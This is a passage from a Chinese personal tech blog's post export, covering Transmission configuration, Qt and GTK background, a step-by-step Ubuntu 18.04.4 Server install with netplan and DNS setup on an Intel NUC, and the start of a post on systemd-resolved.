class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;sort-mode&quot;</span>: <span class=\"string\">&quot;sort-by-age&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;sort-reversed&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-down&quot;</span>: 300, <span class=\"comment\">#平时的下载限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-down-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用平时下载限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-up&quot;</span>: 30, <span class=\"comment\">#平时上传限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;speed-limit-up-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用平时上传限速</span></span><br><span class=\"line\"><span class=\"string\">&quot;start-added-torrents&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;statusbar-stats&quot;</span>: <span class=\"string\">&quot;total-ratio&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;torrent-added-notification-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;torrent-complete-notification-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;torrent-complete-sound-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;trash-can-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;trash-original-torrent-files&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;umask&quot;</span>: 18,</span><br><span class=\"line\"><span class=\"string\">&quot;upload-slots-per-torrent&quot;</span>: 14</span><br><span class=\"line\"><span class=\"string\">&quot;utp-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用μTP协议</span></span><br><span class=\"line\"><span class=\"string\">&quot;watch-dir&quot;</span>: <span class=\"string\">&quot;/home/yys/\\u4e0b\\u8f7d&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;watch-dir-enabled&quot;</span>: <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录二：关于Qt-和-GTK\"><a href=\"#附录二：关于Qt-和-GTK\" class=\"headerlink\" title=\"附录二：关于Qt 和 GTK\"></a>附录二：关于Qt 和 GTK</h2><h3 id=\"Qt\"><a href=\"#Qt\" class=\"headerlink\" title=\"Qt\"></a>Qt</h3><p>1991年，Haavard Nord和Eirik Chambe-Eng开发了“Qt”，该工具包名为Qt是因为字母Q在Haavard的Emacs字体特别漂亮，而“t”代表“toolkit”，灵感来自Xt，X toolkit。<br>后来，两人成立了Trolltech公司（中文名是“奇趣科技”），2008年被NOKIA公司收购，以增强该公司在跨平台软件研发方面的实力，更名Qt Software并宣布开放Qt源代码，<br>2012年8月9日，Digia宣布已完成对诺基亚Qt业务及软件技术的全面收购，并计划将Qt应用到Android、iOS及Windows 8平台上。</p>\n<p>Qt的图形用户界面的基础是QWidget。Qt中所有类型的GUI组件如按钮、标签、工具栏等都派生自QWidget，而QWidget本身则为QObject的子类。Widget负责接收鼠标，键盘和来自窗口系统的其他事件，并描绘了自身显示在屏幕上。每一个GUI组件都是一个widget，widget还可以作为容器，在其内包含其他Widget。<br>使用Qt开发的软件，相同的代码可以在任何支持的平台上编译与执行，而不需要修改源代码。会自动依平台的不同，表现平台特有的图形界面风格。<br>Qt开放源代码，并提供LGPL和GPL的自由软件用户协议，可以免费使用，但商业版需收取授权费。</p>\n<p>KDE Plasma Workspaces就是基于Qt开发的Linux GUI，此外Symbain、MeeGo等手机厂商也采用Qt框架，但现在已经是Android的天下了！！！</p>\n<h3 id=\"GTK\"><a href=\"#GTK\" class=\"headerlink\" title=\"GTK\"></a>GTK</h3><p>GTK（原名GTK+）最初是GIMP的专用开发库（GIMP Toolkit），后来发展为类Unix系统下开发图形界面的应用程序的主流开发工具之一。<br>GTK是自由软件，并且是GNU计划的一部分。自2019年2月6日起，GTK+改名为GTK。<br>GTK使用C语言开发，但使用了面向对象技术，也提供了C++（gtkmm）、Perl、Ruby、Java和Python（PyGTK）绑定，其他的绑定有Ada、D、Haskell、PHP和所有的.NET编程语言。</p>\n<p>GNOME是以GTK为基础，就是说为GNOME编写的程序使用GTK做为其工具箱，Firefox也是基于GTK开发的。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://transmissionbt.com/\">Transmission 的官网 - transmissionbt.com</a></li>\n<li><a href=\"https://github.com/transmission/transmission\">Transmission 的源码</a></li>\n<li><a href=\"https://github.com/transmission/transmission/blob/main/docs/Editing-Configuration-Files.md\">settings.json 的参数设置</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/Qt\">Qt 的 Wiki</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/GTK\">GTK 的 Wiki</a></li>\n<li><a href=\"https://blog.uuz.moe/2017/02/install_transmission/\">Transmission 的安装与配置 - Ubuntu发行版</a></li>\n<li><a href=\"https://wiki.archlinux.org/title/Transmission_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E6%8E%A5%E6%94%B6/%E5%8F%91%E9%80%81%E7%BC%93%E5%86%B2%E5%8C%BA%E8%AE%BE%E7%BD%AE%E5%A4%B1%E8%B4%A5\">Transmission 的安装与配置 - Archlinux发行版</a></li>\n<li><a href=\"http://ronhks.hu/2018/12/30/transmission-network-problem/\">UDP缓冲区不足导致daemon启动失败的解决方案</a></li>\n</ul>\n"},{"title":"Ubuntu 18.04.4的安装步骤","url":"/2020/06/20/Ubuntu-18-04-4%E7%9A%84%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/","content":"<p>这几天折腾NUC主机，在安装Ubuntu 18.04.4 LTS（长期支持的稳定版本）的过程中遇到不少坑，立此存照吧。</p>\n<h2 id=\"Step-0：安装前的准备工作\"><a href=\"#Step-0：安装前的准备工作\" class=\"headerlink\" title=\"Step 0：安装前的准备工作\"></a>Step 0：安装前的准备工作</h2><p>已安装内存和硬盘的NUC主机之外，还需要：</p>\n<ul>\n<li><p>独立显示器：感谢LP赞助的DELL S2319SP</p>\n</li>\n<li><p>USB键盘 + USB鼠标：开机BIOS设置硬件启动顺序时键盘操作不方便</p>\n</li>\n<li><p>有线网络接口：备用先不接</p>\n</li>\n<li><p>Ubuntu启动U盘：制作方法参见<a href=\"%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98.md\">如何制作Ubuntu的USB启动盘</a>，Server版本912M，Desktop版本2.13G</p>\n</li>\n</ul>\n<h2 id=\"Step-1-安装Ubuntu-Server\"><a href=\"#Step-1-安装Ubuntu-Server\" class=\"headerlink\" title=\"Step 1: 安装Ubuntu Server\"></a>Step 1: 安装Ubuntu Server</h2><ol>\n<li><p>插入Ubuntu安装U盘，开机启动后进入安装界面，各种参数选默认</p>\n</li>\n<li><p>完成安装后拔出U盘，重新启动并登录进入新安装的Ubuntu Server<br>开机启动过程中，可能需要在BIOS设置启动顺序（USB—STAT—LAN），进入方法是加电过程中持续按F2<br>强烈建议安装Openssh Server，以后可以拔掉键盘和鼠标，直接远程登录管理主机<br>安装过程中需要设置一个默认用户，root尚未激活<br>由于安装过程中未接网线，完成后所有网络接口都不可用</p>\n <img src=\"/2020/06/20/Ubuntu-18-04-4%E7%9A%84%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/intel-bios.png\" class=\"\"></li>\n</ol>\n<h2 id=\"step-2-激活root用户\"><a href=\"#step-2-激活root用户\" class=\"headerlink\" title=\"step 2: 激活root用户\"></a>step 2: 激活root用户</h2><ol>\n<li><p>以默认用户身份设置root口令，并切换到root</p>\n <figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">sj@nuc5i3:~$ <span class=\"title\">sudo</span> <span class=\"title\">passwd</span> <span class=\"title\">root</span></span></span><br><span class=\"line\"><span class=\"function\">[<span class=\"title\">sudo</span>] <span class=\"title\">password</span> <span class=\"title\">for</span> <span class=\"title\">sj</span>:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Enter</span> <span class=\"title\">new</span> <span class=\"title\">UNIX</span> <span class=\"title\">password</span>:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Retype</span> <span class=\"title\">new</span> <span class=\"title\">UNIX</span> <span class=\"title\">password</span>:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">passwd</span>: <span class=\"title\">password</span> <span class=\"title\">updated</span> <span class=\"title\">successfully</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sj</span>@<span class=\"title\">nuc5i3</span>:~$ <span class=\"title\">su</span> -</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Password</span>:</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">root</span>@<span class=\"title\">nuc5i3</span>:~#</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果需要允许root用户远程登录，修改配置文件<code>/etc/ssh/sshd_config</code>，将<code>PermitRootLogin</code>改为<code>yes</code></p>\n <figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">#PermitRootLogin prohibit-password</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Step-3-设置有线网络接入\"><a href=\"#Step-3-设置有线网络接入\" class=\"headerlink\" title=\"Step 3: 设置有线网络接入\"></a>Step 3: 设置有线网络接入</h2><ol>\n<li><p>插入有线网络，没啥动静？ 别着急，还没配置网络参数呢！</p>\n</li>\n<li><p>编辑网卡配置文件<code>/etc/netplan/50-cloud-init.yaml</code>，至少需要设置IP地址和默认网关</p>\n <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is generated from information provided by the datasource.  Changes</span></span><br><span class=\"line\"><span class=\"comment\"># to it will not persist across an instance reboot.  To disable cloud-init&#x27;s</span></span><br><span class=\"line\"><span class=\"comment\"># network configuration capabilities, write a file</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class=\"line\"><span class=\"comment\"># network: &#123;config: disabled&#125;</span></span><br><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">    <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">        <span class=\"attr\">enp0s25:</span></span><br><span class=\"line\">            <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">            <span class=\"attr\">addresses:</span> [<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.130</span><span class=\"string\">/24</span>]</span><br><span class=\"line\">            <span class=\"attr\">gateway4:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>netpaln generate</code>刷新网络配置，<code>netplan apply</code>启动有线网卡<br>最后用<code>ifconfig</code>检查网络状态，确认有线网卡<code>enp0s25</code>启动成功</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/etc/netplan# netplan generate</span><br><span class=\"line\">root@nuc5i3:/etc/netplan# netplan apply</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/etc/netplan# ifconfig</span><br><span class=\"line\">enp0s25: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.0.130  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class=\"line\">        inet6 fe80::baae:edff:fe73:87fb  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether b8:ae:ed:73:87:fb  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 23068  bytes 14045959 (14.0 MB)</span><br><span class=\"line\">        RX errors 0  dropped 23  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 12173  bytes 1273580 (1.2 MB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\">        device interrupt 20  memory 0xf7100000-f7120000  </span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 144  bytes 13680 (13.6 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 144  bytes 13680 (13.6 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Step-4-设置DNS服务\"><a href=\"#Step-4-设置DNS服务\" class=\"headerlink\" title=\"Step 4: 设置DNS服务\"></a>Step 4: 设置DNS服务</h2><ol>\n<li><p>在基本安装完成后，默认DNS指向的是<code>127.0.0.53:53</code>，无法解析公网域名！！！<br>解决办法：停止并禁用系统默认的DNS服务<code>systemd-resolved</code>，并删除<code>/etc/resolv.conf</code>软连接</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# ping t.cn</span><br><span class=\"line\">ping: t.cn: Temporary failure in name resolution</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:~# netstat -tunpl</span><br><span class=\"line\">Active Internet connections (only servers)</span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class=\"line\">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      1001/systemd-resolv</span><br><span class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      2012/sshd</span><br><span class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      2012/sshd</span><br><span class=\"line\">udp        0      0 127.0.0.53:53           0.0.0.0:*                           1001/systemd-resolv</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:~# systemctl stop systemd-resolved</span><br><span class=\"line\">root@nuc5i3:~# systemctl disable systemd-resolved</span><br><span class=\"line\">root@nuc5i3:~# systemctl status systemd-resolved</span><br><span class=\"line\">● systemd-resolved.service - Network Name Resolution</span><br><span class=\"line\">Loaded: loaded (/lib/systemd/system/systemd-resolved.service; disabled; vendor preset: enabled)</span><br><span class=\"line\">Active: inactive (dead)</span><br><span class=\"line\">    Docs: man:systemd-resolved.service(8)</span><br><span class=\"line\">        https://www.freedesktop.org/wiki/Software/systemd/resolved</span><br><span class=\"line\">        https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers</span><br><span class=\"line\">        https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/# ls -l /etc/resolv.conf</span><br><span class=\"line\">lrwxrwxrwx 1 root root 39 Feb  3 18:22 /etc/resolv.conf -&gt; ../run/systemd/resolve/stub-resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/# rm /etc/resolv.conf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重新创建文件<code>/etc/resolv.conf</code>，并写入自定义的nameserver</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# cat /etc/resolv.conf</span><br><span class=\"line\">nameserver 192.168.0.1</span><br><span class=\"line\">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>简单用<code>dig</code>测试一下，DNS现在正常工作了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# dig t.cn</span><br><span class=\"line\"></span><br><span class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.11-Ubuntu &lt;&lt;&gt;&gt; t.cn</span><br><span class=\"line\">;; global options: +cmd</span><br><span class=\"line\">;; Got answer:</span><br><span class=\"line\">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 22813</span><br><span class=\"line\">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class=\"line\"></span><br><span class=\"line\">;; OPT PSEUDOSECTION:</span><br><span class=\"line\">; EDNS: version: 0, flags:; udp: 512</span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;t.cn.    IN  A</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">t.cn.    59  IN  A  116.211.169.137</span><br><span class=\"line\"></span><br><span class=\"line\">;; Query time: 197 msec</span><br><span class=\"line\">;; SERVER: 8.8.8.8#53(8.8.8.8)</span><br><span class=\"line\">;; WHEN: Sat Jun 20 13:05:06 UTC 2020</span><br><span class=\"line\">;; MSG SIZE  rcvd: 49</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Step-5-设置Wifi网络接入（可选）\"><a href=\"#Step-5-设置Wifi网络接入（可选）\" class=\"headerlink\" title=\"Step 5: 设置Wifi网络接入（可选）\"></a>Step 5: 设置Wifi网络接入（可选）</h2><ol>\n<li><p>在确认已连接公网、且<strong>DNS正常工作</strong>的前提下，在线安装<code>network-manager</code>（其中包括了无线网卡驱动程序等必需的软件包）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">apt update</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">apt install network-manager</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：如果有线网卡没有配置nameserver，而且缺少上一步强行设置nameserver的情况下，由于不能正确解析公网域名，apt无法工作！！！</p>\n</blockquote>\n</li>\n<li><p>再次编辑<code>/etc/netplan/50-cloud-init.yaml</code>，至少需要配置<code>Access-points</code>的SSID和接入密码等。<br>注意：必须显示定义渲染方式为<code>NetworkManager</code>，这也是上一步需要apt安装的原因。</p>\n <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is generated from information provided by the datasource.  Changes</span></span><br><span class=\"line\"><span class=\"comment\"># to it will not persist across an instance reboot.  To disable cloud-init&#x27;s</span></span><br><span class=\"line\"><span class=\"comment\"># network configuration capabilities, write a file</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class=\"line\"><span class=\"comment\"># network: &#123;config: disabled&#125;</span></span><br><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">    <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"attr\">renderer:</span> <span class=\"string\">NetworkManager</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">        <span class=\"attr\">enp0s25:</span></span><br><span class=\"line\">            <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">            <span class=\"attr\">addresses:</span> [<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.130</span><span class=\"string\">/24</span>]</span><br><span class=\"line\">            <span class=\"attr\">gateway4:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">wifis:</span></span><br><span class=\"line\">        <span class=\"attr\">wlp2s0:</span></span><br><span class=\"line\">            <span class=\"attr\">access-points:</span></span><br><span class=\"line\">                <span class=\"attr\">&quot;NETGEAR59&quot;:</span></span><br><span class=\"line\">                    <span class=\"attr\">password:</span> <span class=\"string\">&quot;xxxxxxxx&quot;</span></span><br><span class=\"line\">            <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">            <span class=\"attr\">addresses:</span> [<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.131</span><span class=\"string\">/24</span>]</span><br><span class=\"line\">            <span class=\"attr\">gateway4:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>再次<code>netplan generate</code>检查并刷新网络配置，<code>netplan apply</code>启动无线网卡。<br>检查网络状态，<code>ifconfig</code>确认无线网卡<code>wlp2s0</code>启动成功<br>注意：<code>netplan</code>有中间配置文件的刷新机制，generate + apply是一个良好的操作习惯。</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/etc/netplan# netplan generate</span><br><span class=\"line\">root@nuc5i3:/etc/netplan# netplan apply</span><br><span class=\"line\">root@nuc5i3:/etc# ifconfig</span><br><span class=\"line\">......</span><br><span class=\"line\">wlp2s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.0.131  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class=\"line\">        inet6 fe80::3613:e8ff:fe25:20d8  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 34:13:e8:25:20:d8  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 501  bytes 94281 (94.2 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 44  bytes 4436 (4.4 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<h2 id=\"附录：-如何查看网卡的逻辑设备名\"><a href=\"#附录：-如何查看网卡的逻辑设备名\" class=\"headerlink\" title=\"附录： 如何查看网卡的逻辑设备名\"></a>附录： 如何查看网卡的逻辑设备名</h2><p>不同型号的硬件设备，由于其驱动程序的差异，在Ubuntu安装完成后会有不同的设备名。</p>\n<p>使用<code>lshw</code>命令，可以查询全部硬件设备信息，并找到其逻辑设备名。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">lshw</span></span><br><span class=\"line\">nuc5i3</span><br><span class=\"line\">    description: Desktop Computer</span><br><span class=\"line\">    width: 64 bits</span><br><span class=\"line\">    capabilities: smbios-2.8 dmi-2.8 smp vsyscall32</span><br><span class=\"line\">    configuration: boot=normal chassis=desktop uuid=00EC2C62-7872-E311-B04F-B8AEED7387FB</span><br><span class=\"line\">......</span><br><span class=\"line\">        *-network</span><br><span class=\"line\">             description: Ethernet interface</span><br><span class=\"line\">             product: Ethernet Connection (3) I218-V</span><br><span class=\"line\">             vendor: Intel Corporation</span><br><span class=\"line\">             physical id: 19</span><br><span class=\"line\">             bus info: pci@0000:00:19.0</span><br><span class=\"line\">             logical name: enp0s25</span><br><span class=\"line\">             version: 03</span><br><span class=\"line\">             serial: b8:ae:ed:73:87:fb</span><br><span class=\"line\">             size: 100Mbit/s</span><br><span class=\"line\">             capacity: 1Gbit/s</span><br><span class=\"line\">             width: 32 bits</span><br><span class=\"line\">             clock: 33MHz</span><br><span class=\"line\">......</span><br><span class=\"line\">        *-network</span><br><span class=\"line\">            description: Wireless interface</span><br><span class=\"line\">            product: Wireless 7265</span><br><span class=\"line\">            vendor: Intel Corporation</span><br><span class=\"line\">            physical id: 0</span><br><span class=\"line\">            bus info: pci@0000:02:00.0</span><br><span class=\"line\">            logical name: wlp2s0</span><br><span class=\"line\">            version: 59</span><br><span class=\"line\">            serial: 34:13:e8:25:20:d8</span><br><span class=\"line\">            width: 64 bits</span><br><span class=\"line\">            clock: 33MHz</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>还有一个办法，就是命令<code>ip a</code>查看网卡的简要信息。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: enp0s25: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class=\"line\">    link/ether b8:ae:ed:73:87:fb brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.0.130/24 brd 192.168.0.255 scope global enp0s25</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::baae:edff:fe73:87fb/64 scope link</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: wlp2s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class=\"line\">    link/ether 34:13:e8:25:20:d8 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>\n"},{"title":"Ubuntu的DNS服务","url":"/2020/06/20/Ubuntu%E7%9A%84DNS%E6%9C%8D%E5%8A%A1/","content":"<h2 id=\"DNS概述\"><a href=\"#DNS概述\" class=\"headerlink\" title=\"DNS概述\"></a>DNS概述</h2><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。</p>\n<p>DNS服务是一件很复杂的事情，有很多不同来源的设置途径相互影响，主要包括：</p>\n<ul>\n<li>全局配置文件: <code>/etc/systemd/resolved.conf</code></li>\n<li>单个连接的静态配置文件：通过<code>/etc/netplan/*.yaml</code>对单个网卡配置nameserver，还有<code>/etc/systemd/network/*.network</code>???</li>\n<li>单个连接的动态配置 :从DHCP默认网关或其他系统服务得到的DNS设置</li>\n</ul>\n<p>请看官方文档的解释：</p>\n<p>systemd-resolved 为本地应用程序提供了网络名字解析服务。 它不但提供了传统的 DNS&#x2F;DNSSEC 解析与本地缓存功能，还提供了 LLMNR 与 MulticastDNS 的解析(resolver)与应答(responder)的功能。 本地应用程序可以通过三种方式提交网络名字解析请求：</p>\n<p>第一种，通过D-Bus总线上的本地全功能API systemd-resolved (详见 API Documentation)。 这是首选方法，因为它是异步的并且功能最全。 此种方式可以正确返回 DNSSEC 的有效状态，以及支持 link-local 网络所必需的地址的网口范围(interface scope)。</p>\n<p>第二种，通过 glibc 的 getaddrinfo(3), gethostbyname(3) 等相关API(RFC3493)。 这些API受到了广泛的支持(包括非Linux平台)。此种方法不能检查 DNSSEC 的有效状态，并且是同步的。 此种方法由 glibc Name Service Switch (nss(5)) 支持。 必须使用 glibc NSS 模块 nss-resolve(8) 才能让 glibc NSS 使用 systemd-resolved 提供的名字解析功能。</p>\n<p>第三种，通过 systemd-resolved 在本地回环网口 127.0.0.53 上提供的本地DNS服务器。 应用程序可以直接向 127.0.0.53 发送DNS请求，从而直接使用 systemd-resolved 提供的解析服务。 除非确实无法使用前面的 glibc NSS 或 D-Bus API 两种方法， 否则应该尽量避免使用此种方式， 因为无法将各种网络解析功能(例如 link-local 地址或 LLMNR Unicode 域名)全部映射到 单播DNS协议中。</p>\n<h2 id=\"DNS的解析顺序\"><a href=\"#DNS的解析顺序\" class=\"headerlink\" title=\"DNS的解析顺序\"></a>DNS的解析顺序</h2><img src=\"/2020/06/20/Ubuntu%E7%9A%84DNS%E6%9C%8D%E5%8A%A1/dns.jpg\" 